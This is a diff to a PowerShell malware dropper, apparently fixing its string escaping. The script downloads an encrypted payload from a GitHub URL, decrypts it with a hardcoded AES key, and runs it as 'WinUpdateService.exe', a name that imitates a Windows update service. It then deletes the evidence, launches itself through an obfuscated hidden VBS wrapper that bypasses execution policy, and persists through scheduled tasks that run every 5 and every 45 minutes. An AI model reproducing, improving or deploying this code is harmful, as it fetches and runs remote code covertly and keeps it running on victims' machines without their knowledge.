@@ -23,67 +23,73 @@ $fullPath = Join-Path -Path $randomPath -ChildPath $randomProgram
 
 New-Item -Path $fullPath -ItemType Directory -Force | Out-Null
 
-$scriptContent = @'
-function HexStringToByteArray([string]$hex) {
-    $bytes = New-Object byte[] ($hex.Length / 2)
-    for ($i = 0; $i -lt $bytes.Length; $i++) {
-        $bytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
+if (-Not (Test-Path $fullPath)) {
+    Write-Error "فشل إنشاء المجلد: $fullPath"
+    return
+}
+
+$scriptContent = @"
+function HexStringToByteArray([string]`$hex) {
+    `$bytes = New-Object byte[] (`$hex.Length / 2)
+    for (`$i = 0; `$i -lt `$bytes.Length; `$i++) {
+        `$bytes[`$i] = [Convert]::ToByte(`$hex.Substring(`$i * 2, 2), 16)
     }
-    return $bytes
+    return `$bytes
 }
 function AES-Decrypt {
     param (
-        [byte[]]$Data,
-        [byte[]]$Key,
-        [byte[]]$IV
+        [byte[]]`$Data,
+        [byte[]]`$Key,
+        [byte[]]`$IV
     )
     try {
-        $aes = [System.Security.Cryptography.Aes]::Create()
-        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        $aes.Key = $Key
-        $aes.IV = $IV
-        $decryptor = $aes.CreateDecryptor()
-        $ms = New-Object System.IO.MemoryStream
-        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
-        $cs.Write($Data, 0, $Data.Length)
-        $cs.FlushFinalBlock()
-        $cs.Close()
-        $ms.Close()
-        return $ms.ToArray()
+        `$aes = [System.Security.Cryptography.Aes]::Create()
+        `$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        `$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        `$aes.Key = `$Key
+        `$aes.IV = `$IV
+        `$decryptor = `$aes.CreateDecryptor()
+        `$ms = New-Object System.IO.MemoryStream
+        `$cs = New-Object System.Security.Cryptography.CryptoStream(`$ms, `$decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+        `$cs.Write(`$Data, 0, `$Data.Length)
+        `$cs.FlushFinalBlock()
+        `$cs.Close()
+        `$ms.Close()
+        return `$ms.ToArray()
     }
     catch {
-        return $null
+        return `$null
     }
 }
-$tempPath = "$env:TEMP\enc_payload.bin"
-Invoke-WebRequest -Uri "https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/encrypted_payload.bin" -OutFile $tempPath
-$encBytes = [System.IO.File]::ReadAllBytes($tempPath)
-$keyHex = "00112233445566778899aabbccddeeff"
-$ivHex = "0102030405060708090a0b0c0d0e0f10"
-$key = HexStringToByteArray $keyHex
-$iv = HexStringToByteArray $ivHex
-$decBytes = AES-Decrypt -Data $encBytes -Key $key -IV $iv
-if ($decBytes -ne $null) {
-    $outPath = Join-Path -Path $using:fullPath -ChildPath "WinUpdateService.exe"
-    [System.IO.File]::WriteAllBytes($outPath, $decBytes)
-    if (Test-Path $outPath) {
-        Start-Process $outPath
+`$tempPath = "`$env:TEMP\enc_payload.bin"
+Invoke-WebRequest -Uri "https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/encrypted_payload.bin" -OutFile `$tempPath
+`$encBytes = [System.IO.File]::ReadAllBytes(`$tempPath)
+`$keyHex = "00112233445566778899aabbccddeeff"
+`$ivHex = "0102030405060708090a0b0c0d0e0f10"
+`$key = HexStringToByteArray `$keyHex
+`$iv = HexStringToByteArray `$ivHex
+`$decBytes = AES-Decrypt -Data `$encBytes -Key `$key -IV `$iv
+if (`$decBytes -ne `$null) {
+    `$outPath = Join-Path -Path "$fullPath" -ChildPath "WinUpdateService.exe"
+    [System.IO.File]::WriteAllBytes(`$outPath, `$decBytes)
+    if (Test-Path `$outPath) {
+        Start-Process `$outPath
         Start-Sleep -Seconds 5
-        Remove-Item $outPath -Force
+        Remove-Item `$outPath -Force
     }
 }
-Remove-Item $tempPath -Force
-'@
+Remove-Item `$tempPath -Force
+"@
 
 Set-Content -Path (Join-Path -Path $fullPath -ChildPath "$randomProgram.ps1") -Value $scriptContent -Force
 
 $vbsContent = @"
 On Error Resume Next
-Dim arr, cmd
+Dim arr, cmd, shell
 arr = Split(""p,o,w,e,r,s,h,e,l,l"", "","")
-cmd = Join(arr, """") & "" -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """" & ""$fullPath\$randomProgram.ps1"" & """"
-CreateObject(""WScript.Shell"").Run cmd, 0, False
+cmd = Join(arr, """") & "" -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """" & WScript.Arguments(0) & """"
+Set shell = CreateObject(""WScript.Shell"")
+shell.Run cmd, 0, False
 "@
 
 Set-Content -Path (Join-Path -Path $fullPath -ChildPath "$randomProgram.vbs") -Value $vbsContent -Force
@@ -91,7 +97,7 @@ Set-Content -Path (Join-Path -Path $fullPath -ChildPath "$randomProgram.vbs") -V
 Start-Sleep 2
 
 try {
-    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$fullPath\$randomProgram.vbs`""
+    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$fullPath\$randomProgram.vbs`" `"$fullPath\$randomProgram.ps1`""
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $randomProgram -Force
 } catch {}
@@ -99,11 +105,13 @@ try {
 Start-Sleep 2
 
 $taskName2 = "${randomProgram}Startup"
-$scriptPath = "`"$fullPath\$randomProgram.vbs`""
+$vbsFullPath = "$fullPath\$randomProgram.vbs"
+$ps1FullPath = "$fullPath\$randomProgram.ps1"
 
 try {
-    schtasks /create /tn $taskName2 /tr $scriptPath /sc MINUTE /mo 45 /f
+    schtasks /create /tn $taskName2 /tr "`"wscript.exe`" `"$vbsFullPath`" `"$ps1FullPath`"" /sc MINUTE /mo 45 /f
 } catch {}
 
 Start-Sleep 5
+
 schtasks /run /tn $randomProgram
